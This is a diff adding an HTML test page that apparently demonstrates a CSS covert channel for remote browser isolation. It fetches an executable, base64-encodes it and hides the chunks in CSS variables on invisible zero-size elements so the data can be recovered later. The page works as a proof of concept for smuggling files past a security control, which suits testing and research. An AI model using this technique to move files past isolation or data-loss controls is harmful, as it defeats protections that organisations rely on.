@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <title>RBI 記憶體檔案還原測試頁面</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        button { padding: 10px 15px; font-size: 16px; cursor: pointer; }
+        .status { margin-top: 15px; font-weight: bold; color: green; }
+    </style>
+</head>
+<body>
+  <h2>CSS Covert Channel</h2>
+  <button onclick="injectCSS()">1. 編碼並注入 CSS</button>
+  <!-- 用於承載 CSS class 的容器 -->
+  <div id="css-stego-container"></div>
+  <div id="log"></div>
+
+  <script>
+    const log = (msg) => document.getElementById('log').innerHTML += msg + '<br>';
+    const CHUNK_SIZE = 2000; // 每個 CSS 變數承載的字元數
+
+    async function injectCSS() {
+      log('正在準備 CSS 隱寫...');
+      //const mockData = new Uint8Array(15000).map((_, i) => i % 256);
+	const resp = await fetch('./7z2602-x64.exe');
+	if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+	const buffer = await resp.arrayBuffer();
+	const mockData = new Uint8Array(buffer);
+	log(`✅ 檔案讀取成功: ${mockData.length} bytes`);	  
+        const blob = new Blob([mockData], { type: 'application/octet-stream' });
+        const b64Data = await new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = () => {
+            // reader.result 格式為 "data:application/octet-stream;base64,xxxxx..."
+            // 我們只需要逗號後面的純 Base64 字串
+            resolve(reader.result.split(',')[1]);
+          };
+          reader.onerror = () => reject(new Error('FileReader 讀取失敗'));
+          reader.readAsDataURL(blob);
+        });
+        
+        log(`✅ Base64 轉換完成，總長度: ${b64Data.length}`);	
+      //const b64Data = btoa(String.fromCharCode.apply(null, mockData));
+      
+      const container = document.getElementById('css-stego-container');
+      const totalChunks = Math.ceil(b64Data.length / CHUNK_SIZE);
+      let cssText = '';
+
+      for (let i = 0; i < totalChunks; i++) {
+        const chunk = b64Data.substring(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
+        // 建立極度隱蔽的 class，使用 CSS 變數儲存資料
+        // 將這些元素設為 0 尺寸，不影響版面
+        cssText += `.c${i}{--d:"${chunk}";width:0;height:0;overflow:hidden;display:block;}\n`;
+      }
+
+      // 注入 <style> 標籤
+      const style = document.createElement('style');
+      style.textContent = cssText;
+      document.head.appendChild(style);
+
+      // 注入對應的 DOM 元素 (必須有元素才能用 getComputedStyle 讀取)
+      for (let i = 0; i < totalChunks; i++) {
+        const div = document.createElement('div');
+        div.className = `c${i}`;
+        container.appendChild(div);
+      }
+
+      log(`✅ CSS 隱寫注入完成，共 ${totalChunks} 個變數，等待同步...`);
+    }
+  </script>
+</body>
+</html>
